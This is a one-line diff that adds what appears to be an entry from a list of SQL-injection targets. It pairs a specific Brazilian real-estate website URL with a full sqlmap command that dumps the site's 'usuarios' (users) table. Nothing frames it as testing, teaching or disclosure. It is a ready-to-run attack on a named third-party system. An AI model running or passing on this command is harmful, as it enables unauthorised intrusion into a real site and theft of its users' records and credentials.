@@ -1,0 +1,1 @@
+https://www.houseassessoriaimobiliaria.com.br/php/imovel.php?idimovel=124 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.houseassessoriaimobiliaria.com.br/php/imovel.php?idimovel=124 -D houseassessori -T usuarios --dump
